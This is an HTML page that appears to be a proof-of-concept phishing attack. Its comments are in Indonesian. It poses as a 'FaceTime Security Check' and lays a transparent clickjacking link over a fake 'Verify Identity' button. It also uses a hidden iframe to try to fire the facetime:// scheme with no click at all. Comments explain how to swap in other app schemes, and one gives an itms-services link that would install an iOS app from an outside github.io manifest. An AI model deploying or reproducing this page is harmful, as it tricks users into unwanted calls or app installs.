<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .panel {
    background: #fff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    text-align: center;
    max-width: 400px;
  }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  .fake-btn {
    background: #007aff;
    color: #fff;
    padding: 15px 30px;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    display: inline-block;
    position: relative;
  }
  
  /* Tombol Transparan (Clickjacking) */
  .trap-link {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 FaceTime Security Check</h1>
  <p>Klik tombol di bawah untuk memverifikasi identitas Anda.</p>
  
  <!-- UI PALSU DENGAN LINK CLICKJACKING -->
  <div class="fake-btn" style="position: relative;">
    Verify Identity
    <!-- SKEMA TARGET: Ganti dengan itms-services://, zoommtg://, atau slack:// -->
    <a href="facetime://security-check@apple.com" class="trap-link"></a>
  </div>
</div>

<script>
(function () {
  'use strict';

  console.log("[!] Protocol Handler PoC Loaded.");
  
  // ============================================
  // ZERO-CLICK TRIGGER (BLOCKED BY MODERN BROWSERS)
  // ============================================
  // Mencoba memicu skema tanpa klik.
  // Safari/Chrome modern akan memblokir ini.
  setTimeout(function() {
    try {
      // Jangan gunakan window.location.href (bisa merusak history)
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = 'facetime://security-check@apple.com';
      document.body.appendChild(iframe);
      console.log("[!] Zero-Click Iframe Trigger sent.");
    } catch(e) {
      console.log("Zero-Click Trigger blocked.");
    }
  }, 1000);

  // ============================================
  // NOTE: Untuk itms-services:// (OTA Install)
  // ============================================
  // Untuk menginstal aplikasi iOS secara OTA, skema harus:
  // itms-services://?action=download-manifest&url=https://domain.com/manifest.plist
  
  // Jika target Anda iOS, ganti href di atas menjadi:
  // <a href="itms-services://?action=download-manifest&url=https://artha231.github.io/manifest.plist" class="trap-link"></a>

})();
</script>
</body>
</html>
